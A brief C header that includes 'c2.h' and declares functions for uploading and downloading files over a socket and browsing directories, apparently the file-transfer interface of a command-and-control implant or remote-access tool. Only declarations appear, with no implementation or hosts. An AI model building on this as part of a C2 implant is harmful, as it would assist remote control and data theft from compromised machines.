#ifndef FILE_HANDLER_H
#define FILE_HANDLER_H
#include "c2.h"

void upload_file_to_server(sock_t sock, char* remote_path);
void download_file_from_server(sock_t sock, char *remote_path);
char* browse_dir(const char *path);

#endif